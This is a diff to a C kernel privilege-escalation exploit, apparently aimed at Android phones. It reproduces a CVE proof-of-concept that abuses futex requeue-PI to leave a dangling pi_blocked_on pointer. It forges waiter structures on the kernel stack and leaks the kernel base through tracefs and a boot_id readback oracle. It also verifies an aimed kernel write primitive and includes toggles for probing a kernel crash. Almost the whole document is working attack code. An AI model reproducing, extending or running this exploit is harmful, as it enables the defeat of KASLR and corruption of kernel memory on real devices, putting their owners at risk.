@@ -7,7 +7,9 @@
 #ifndef SLIDE_PSELECT_WORD_SHIFT
 #define SLIDE_PSELECT_WORD_SHIFT 0
 #endif
+#ifndef SLIDE_WAIT_NSEC
 #define SLIDE_WAIT_NSEC 50000000L
+#endif
 #define SLIDE_REQUEUE_MAX_POLLS 1000
 #define SLIDE_REQUEUE_POLL_USEC 1000
 
@@ -220,6 +222,13 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   slide_pselect_production_stack = 0;
 #endif
 #endif
+  if (getenv("RMG_CRASH_PROBE")) {
+    /* Diagnostic: force an invalid tree parent into the stamped waiter.
+     * If the PI walk reaches rb_erase, this dereferences ~0x10 and
+     * panics the kernel. A surviving phone means the walk never runs. */
+    pr_info("[TRIG] crash probe armed: tree parent -> 1\n");
+    fflush(stdout);
+  }
   struct slide_waiter_word {
     int word;
     uint64_t value;
@@ -327,6 +336,21 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     }
     if (!((word_mask >> w->word) & 1u)) {
       continue;
+    }
+    if (getenv("RMG_CRASH_PROBE") && w->word == 0) {
+      w->value = 1;
+    }
+    if (getenv("RMG_INIT_TASK_STAMP") && w->word == 6) {
+      /* Aim waiter->task at a REAL task (init_task): every task_struct
+       * deref in the walk then lands on valid kernel state. */
+      w->value = SLIDE_INIT_TASK + slide_p0_offset;
+    }
+    if (getenv("RMG_BENIGN_STAMP") &&
+        (w->word == 2 || w->word == 5)) {
+      /* Zero the tree/pi write children: the walk still runs fully
+       * (erase/requeue with childless nodes) but performs no
+       * aimed write. Surviving this isolates the fatality. */
+      w->value = 0;
     }
     if (slide_pselect_resout_lane()) {
       /* g0s stack layout: the fd-set buffer starts 0x80 below the stale
@@ -494,10 +518,12 @@ void slide_pselect_stack_copy(void) {
     /* res_out lane: the stamp lives on THIS thread's kernel stack, so
      * between the pselect return and the consumer's PI walk this thread
      * must not enter the kernel again (no prints, no sleeps). Pure
-     * userspace spin only. */
+     * userspace spin only. POC choreography gates the walk itself. */
     atomic_store(&slide_consume_go, 1);
-    while (!atomic_load(&slide_consume_stop)) {
-      __asm__ volatile("" ::: "memory");
+    if (!getenv("RMG_POC_CHOREO")) {
+      while (!atomic_load(&slide_consume_stop)) {
+        __asm__ volatile("" ::: "memory");
+      }
     }
     atomic_store(&slide_consume_go, 0);
   }
@@ -809,8 +835,17 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
   }
 
   struct timespec timeout;
+  long wait_nsec = SLIDE_WAIT_NSEC;
+  {
+    const char *wait_env = getenv("RMG_WAIT_NSEC");
+    if (wait_env && *wait_env) {
+      char *end = NULL;
+      long v = strtol(wait_env, &end, 0);
+      if (!*end && v >= 1000000L && v <= 10000000000L) wait_nsec = v;
+    }
+  }
   SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
-  timeout.tv_nsec += SLIDE_WAIT_NSEC;
+  timeout.tv_nsec += wait_nsec;
   if (timeout.tv_nsec >= 1000000000L) {
     timeout.tv_sec++;
     timeout.tv_nsec -= 1000000000L;
@@ -822,7 +857,16 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
                            &slide_f_pi_target, 0);
   int wait_errno = errno;
   pr_info("slide wait_requeue_pi ret=%ld errno=%d\n", wait_ret, wait_errno);
-  if (wait_ret != -1 || wait_errno != ETIMEDOUT) {
+  int wait_deadlocked = atomic_load(&slide_deadlock_seen);
+  if (!wait_deadlocked && (wait_ret != -1 || wait_errno != ETIMEDOUT)) {
+    /* EDEADLK-wake race: main sets deadlock_seen right after the
+     * requeue returns; give it a moment. */
+    for (int spin = 0; spin < 200 && !wait_deadlocked; spin++) {
+      usleep(1000);
+      wait_deadlocked = atomic_load(&slide_deadlock_seen);
+    }
+  }
+  if ((wait_ret != -1 || wait_errno != ETIMEDOUT) && !wait_deadlocked) {
     atomic_store(&slide_route_done, 1);
     return NULL;
   }
@@ -951,7 +995,163 @@ uint64_t slide_read_stext(void) {
              getpid(), (unsigned long long)stext);
   return stext;
 }
+uint64_t slide_child_leak_stext_engine(void);
+
+/* POC-faithful choreography: replicates the original CVE proof-of-concept
+ * thread sequencing exactly (which provably leaves the dangling
+ * task->pi_blocked_on on this kernel), with our res_in/res_out pselect
+ * stamp as the stack writer and the boot_id readback as the oracle. */
+static uint32_t poc_f_wait;
+static uint32_t poc_f_pi_target;
+static uint32_t poc_f_pi_chain;
+static volatile int poc_a_ready;
+static volatile int poc_a_waiting;
+static volatile int poc_b_started;
+static volatile int poc_deadlock_seen;
+static volatile int poc_consume;
+static volatile int poc_stamp_ready;
+static int poc_tid;
+
+static void *poc_waiter(void *arg __attribute__((unused))) {
+  struct timespec ts;
+  disable_rseq_for_thread();
+  poc_tid = (int)syscall(SYS_gettid);
+  syscall(SYS_futex, &poc_f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
+  poc_a_ready = 1;
+  usleep(20000);
+  clock_gettime(CLOCK_MONOTONIC, &ts);
+  ts.tv_nsec += 50000000;
+  if (ts.tv_nsec >= 1000000000L) {
+    ts.tv_sec++;
+    ts.tv_nsec -= 1000000000L;
+  }
+  poc_a_waiting = 1;
+  syscall(SYS_futex, &poc_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &ts,
+          &poc_f_pi_target, 0);
+  while (poc_deadlock_seen == 0) {
+    syscall(SYS_futex, (int *)&poc_deadlock_seen, FUTEX_WAIT, 0, 0, 0, 0);
+  }
+  poc_consume = 1;
+  syscall(SYS_futex, (int *)&poc_consume, FUTEX_WAKE, 1, 0, 0, 0);
+  pr_info("[POC] waiter returned; stamping\n");
+  fflush(stdout);
+  slide_pselect_stack_copy();
+  /* Stamp is in place. This thread must stay out of the kernel from
+   * here (the stale waiter on our stack must survive until the
+   * consumer's walk), and the consumer spin-waits on this flag. */
+  __sync_synchronize();
+  poc_stamp_ready = 1;
+  for (;;) {
+    __asm__ volatile("yield" ::: "memory");
+  }
+  return NULL;
+}
+
+static void *poc_owner(void *arg __attribute__((unused))) {
+  disable_rseq_for_thread();
+  syscall(SYS_futex, &poc_f_pi_target, FUTEX_LOCK_PI, 0, 0, 0, 0);
+  while (!poc_a_ready) {
+    __asm__ volatile("yield" ::: "memory");
+  }
+  poc_b_started = 1;
+  syscall(SYS_futex, &poc_f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
+  for (;;) {
+    sleep(1);
+  }
+  return NULL;
+}
+
+static void *poc_consumer(void *arg __attribute__((unused))) {
+  disable_rseq_for_thread();
+  int tid;
+  while (!(tid = poc_tid)) {
+    __asm__ volatile("yield" ::: "memory");
+  }
+  while (poc_consume == 0) {
+    __asm__ volatile("yield" ::: "memory");
+  }
+  while (poc_stamp_ready == 0) {
+    __asm__ volatile("yield" ::: "memory");
+  }
+  /* POC attr: policy=3 (SCHED_BATCH), nice=19. Full kernel-sized
+   * struct (56 bytes incl. util_min/util_max) — a short struct is
+   * rejected with E2BIG and no PI walk runs. */
+  struct {
+    uint32_t size;
+    uint32_t policy;
+    uint64_t flags;
+    int32_t nice;
+    uint32_t priority;
+    uint64_t runtime;
+    uint64_t deadline;
+    uint64_t period;
+    uint32_t util_min;
+    uint32_t util_max;
+  } attr;
+  memset(&attr, 0, sizeof(attr));
+  attr.size = sizeof(attr);
+  attr.policy = 3;
+  attr.nice = 19;
+  pr_info("[POC] consumer sched_setattr tid=%d policy=3 nice=19\n", tid);
+  fflush(stdout);
+  long ret = syscall(SYS_sched_setattr, tid, &attr, 0);
+  pr_info("[POC] consumer sched_setattr ret=%ld errno=%d\n", ret, errno);
+  fflush(stdout);
+  for (;;) {
+    sleep(1);
+  }
+  return NULL;
+}
+
 uint64_t slide_child_leak_stext(void) {
+  if (!getenv("RMG_POC_CHOREO")) {
+    return slide_child_leak_stext_engine();
+  }
+  pthread_t th;
+  poc_f_wait = 0;
+  poc_f_pi_target = 0;
+  poc_f_pi_chain = 0;
+  poc_a_ready = 0;
+  poc_a_waiting = 0;
+  poc_b_started = 0;
+  poc_deadlock_seen = 0;
+  poc_consume = 0;
+  poc_stamp_ready = 0;
+  poc_tid = 0;
+
+  pthread_create(&th, 0, poc_owner, 0);
+  pthread_create(&th, 0, poc_consumer, 0);
+  pthread_create(&th, 0, poc_waiter, 0);
+  while (!poc_a_waiting || !poc_b_started) {
+    usleep(1000);
+  }
+  usleep(20000);
+  long ret = syscall(SYS_futex, &poc_f_wait, FUTEX_CMP_REQUEUE_PI, 1, 1,
+                     &poc_f_pi_target, 0);
+  int reerrno = errno;
+  pr_info("[POC] cmp_requeue_pi ret=%ld errno=%d\n", ret, reerrno);
+  fflush(stdout);
+  poc_deadlock_seen = 1;
+  syscall(SYS_futex, (int *)&poc_deadlock_seen, FUTEX_WAKE, 1, 0, 0, 0);
+
+  /* Give the waiter + consumer time to run the stamp and the walk. */
+  usleep(1500000);
+  uint64_t stext = slide_read_stext();
+  pr_info("[POC] boot_id readback stext=%016llx\n",
+          (unsigned long long)stext);
+  fflush(stdout);
+  if (stext) {
+    return stext;
+  }
+  /* No leak: park forever instead of exiting; task teardown would walk
+   * the dangling pi_blocked_on through our forged waiter. */
+  for (;;) {
+    pause();
+  }
+  return 0;
+}
+
+uint64_t slide_child_leak_stext_engine(void) {
   pthread_t waiter;
   pthread_t owner;
   pthread_t consumer;
@@ -968,6 +1168,22 @@ uint64_t slide_child_leak_stext(void) {
   long requeue_ret = 0;
   int requeue_errno = 0;
   int requeue_polls = 0;
+  {
+    /* Arm delay: let the waiter park inside FUTEX_WAIT_REQUEUE_PI
+     * before the requeue fires, so the EDEADLK handling wakes it from
+     * the requeue path (the interleave that leaves pi_blocked_on
+     * dangling). */
+    long arm_usec = 20000;
+    const char *arm_env = getenv("RMG_REQUEUE_ARM_USEC");
+    if (arm_env && *arm_env) {
+      char *end = NULL;
+      long v = strtol(arm_env, &end, 0);
+      if (!*end && v >= 0 && v <= 1000000) arm_usec = v;
+    }
+    pr_info("[TRIG] requeue arm delay=%ld usec\n", arm_usec);
+    fflush(stdout);
+    usleep((useconds_t)arm_usec);
+  }
   while (requeue_polls < SLIDE_REQUEUE_MAX_POLLS) {
     requeue_polls++;
     errno = 0;
@@ -1293,6 +1509,7 @@ static int slide_leak_physical_base(void) {
             gate_result, fresh_attempt, fresh_page_attempts);
     if (getenv("P0_ORACLE_GATE_DIAG")) {
       pr_info("p0 physical gate diagnostic result=%d\n", gate_result);
+      p0_dump_gate_target(slide_oracle_target);
       if (gate_result != 0) {
         slide_restore_physical_oracle();
       }
@@ -1358,6 +1575,7 @@ static int slide_leak_physical_base(void) {
   int gate_result = verify_p0_pipe_oracle_gate();
   if (getenv("P0_ORACLE_GATE_DIAG")) {
     pr_info("p0 physical gate diagnostic result=%d\n", gate_result);
+    p0_dump_gate_target(slide_oracle_target);
     if (gate_result != 0) {
       slide_restore_physical_oracle();
     }
@@ -1635,6 +1853,92 @@ static int slide_commit_stext(uint64_t stext, const char *source) {
   return 1;
 }
 
+#if defined(SLIDE_APP_TRACEFS) && SLIDE_APP_TRACEFS
+/* S2: with the slide known from tracefs, run exactly one classic write
+ * attempt: spray the bank with .data-aimed links, stamp, walk, and read
+ * back the redirected boot_id. Returns 1 when the readback reproduces the
+ * tracefs slide (the write primitive works on this boot). */
+static int slide_classic_write_verify(uintptr_t offset) {
+  slide_classic_bank_mode = 1;
+  slide_classic_offset = offset;
+  slide_p0_offset = offset;
+
+  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
+  slide_classic_bank_mode = 0;
+  if (!page_base) {
+    pr_warning("tracefs classic write: page prepare failed\n");
+    return 0;
+  }
+  if (!select_slide_payload_slot(offset)) {
+    pr_warning("tracefs classic write: slot selection failed offset=%08zx\n",
+               offset);
+    return 0;
+  }
+
+  int raw_fds[2];
+  SYSCHK(pipe(raw_fds));
+  int fds[2];
+  fds[0] = SYSCHK(fcntl(raw_fds[0], F_DUPFD, slide_pselect_nfds + 128));
+  fds[1] = SYSCHK(fcntl(raw_fds[1], F_DUPFD, slide_pselect_nfds + 129));
+  SYSCHK(close(raw_fds[0]));
+  SYSCHK(close(raw_fds[1]));
+
+  pid_t child = SYSCHK(fork());
+  if (child == 0) {
+    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
+    if (getppid() == 1) {
+      _exit(1);
+    }
+    SYSCHK(close(fds[0]));
+    disable_rseq_for_thread();
+    slide_log_child_context();
+    uint64_t stext = slide_child_leak_stext();
+    if (stext) {
+      SYSCHK(write(fds[1], &stext, sizeof(stext)));
+      _exit(0);
+    }
+    _exit(1);
+  }
+
+  SYSCHK(close(fds[1]));
+  uint64_t stext = 0;
+  ssize_t n = read(fds[0], &stext, sizeof(stext));
+  SYSCHK(close(fds[0]));
+  int status = 0;
+  /* On failure the child parks forever (its teardown would walk the
+   * dangling pi_blocked_on); poll briefly and abandon it in that case. */
+  for (int i = 0; i < 40; i++) {
+    pid_t got = waitpid(child, &status, WNOHANG);
+    if (got == child) {
+      status = -1;
+      break;
+    }
+    if (got < 0 && errno != EINTR) {
+      break;
+    }
+    usleep(100000);
+  }
+
+  if (n != (ssize_t)sizeof(stext) || !stext) {
+    pr_warning("tracefs classic write: no boot_id leak (dangling link "
+               "absent this attempt)\n");
+    return 0;
+  }
+  int match = stext == kaslr_base;
+  if (match) {
+    pr_success("tracefs classic write VERIFIED: boot_id readback stext="
+               "%016llx equals tracefs slide\n",
+               (unsigned long long)stext);
+  } else {
+    pr_warning("tracefs classic write MISMATCH: readback stext=%016llx "
+               "tracefs base=%016llx\n",
+               (unsigned long long)stext,
+               (unsigned long long)kaslr_base);
+  }
+  return match;
+}
+#endif
+
 int slide_leak_kernel_base(void) {
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
   const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
@@ -1685,6 +1989,22 @@ int slide_leak_kernel_base(void) {
     return slide_commit_stext(KIMAGE_TEXT_BASE + value, "forced");
 #endif
   }
+#if defined(SLIDE_APP_TRACEFS) && SLIDE_APP_TRACEFS
+  {
+    uintptr_t tracefs_offset = 0;
+    pr_info("slide trying tracefs KASLR first (S2)\n");
+    if (slide_tracefs_try_leak(&tracefs_offset)) {
+      if (!slide_commit_stext(KIMAGE_TEXT_BASE + tracefs_offset, "tracefs")) {
+        return 0;
+      }
+      int write_ok = slide_classic_write_verify(tracefs_offset);
+      pr_success("slide tracefs-first result offset=%08zx write_verified=%d\n",
+                 tracefs_offset, write_ok);
+      return 1;
+    }
+    pr_warning("slide tracefs failed; falling back to physical P0 oracle\n");
+  }
+#endif
   return slide_leak_physical_base();
 #else
   const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
